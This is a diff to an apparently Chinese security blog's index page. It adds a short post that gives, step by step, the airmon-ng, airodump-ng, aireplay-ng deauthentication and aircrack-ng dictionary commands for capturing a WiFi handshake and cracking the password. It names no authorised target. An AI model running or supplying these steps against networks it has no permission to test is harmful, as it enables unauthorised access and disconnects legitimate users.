@@ -57,7 +57,7 @@
 		</nav>
 		
 		<nav>
-			总文章数 128
+			总文章数 129
 		</nav>
 		<nav class="header-smart-menu">
     		
@@ -135,6 +135,96 @@
           </div>
           <div id="js-content" class="content-ll">
             
+  
+    <article id="post-kali爆破WiFi密码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/02/25/kali%E7%88%86%E7%A0%B4WiFi%E5%AF%86%E7%A0%81/">kali爆破WiFi密码</a>
+    </h1>
+  
+
+        
+        <a href="/2020/02/25/kali%E7%88%86%E7%A0%B4WiFi%E5%AF%86%E7%A0%81/" class="archive-article-date">
+  	<time datetime="2020-02-25T11:45:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+<ol>
+<li>ifconfig                 查看网卡信息 显示有wlan0即为无线网卡</li>
+<li>airmon-ng start wlan0         启动网卡监听模式</li>
+<li>ifconfig                 看看网卡名是不是变成了wlan0mon，是则启动成功</li>
+<li>airodump-ng wlan0mon             扫描附近wifi后，出现要破解的wifi，ctrl+C停止扫描<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BSSID：MAC地址（记录1）</span><br><span class="line">PWR：信号强度</span><br><span class="line">#Data：传输的数据</span><br><span class="line">CH：信号频道（记录2）</span><br><span class="line">ESSID:wifi名称</span><br></pre></td></tr></table></figure></li>
+<li>airodump-ng -c 记录2 –bssid 记录1 -w 握手包存放路径  </li>
+<li>aireplay-ng -0 0 -a 记录1 wlan0mon 攻击wifi使连接用户其重新连接，记得及时关闭 </li>
+<li>抓包界面右上角出现  WPA handshake：XX:XX:XX:XX:XX：XX 即为抓包成功，可关闭转包界面</li>
+<li>airmon-ng stop  wlan0mon 关闭网卡监听状态</li>
+<li>破解密码<br>aircrack-ng -w 字典路径 /握手包路径</li>
+</ol>
+
+      
+      
+    
+      <div class="declare" hidden="hidden"></div>
+    
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">技术文档</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/02/25/kali%E7%88%86%E7%A0%B4WiFi%E5%AF%86%E7%A0%81/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+<!--显示阅读次数-->
+
+
   
     <article id="post-XSS靶场记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
@@ -834,87 +924,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2020/02/01/sqli-labs-WriteUps/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-<!--显示阅读次数-->
-
-
-  
-    <article id="post-Upload-labs-WriteUps" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/02/01/Upload-labs-WriteUps/">Upload-labs刷题记录</a>
-    </h1>
-  
-
-        
-        <a href="/2020/02/01/Upload-labs-WriteUps/" class="archive-article-date">
-  	<time datetime="2020-02-01T14:42:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>upload-labs刷题记录</p>
-        
-          <a class="article-more-a" href="/2020/02/01/Upload-labs-WriteUps/#more">more >></a>
-        
-      
-      
-    
-      <div class="declare" hidden="hidden"></div>
-    
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/02/01/Upload-labs-WriteUps/">展开全文 >></a>
         </p>
       
 
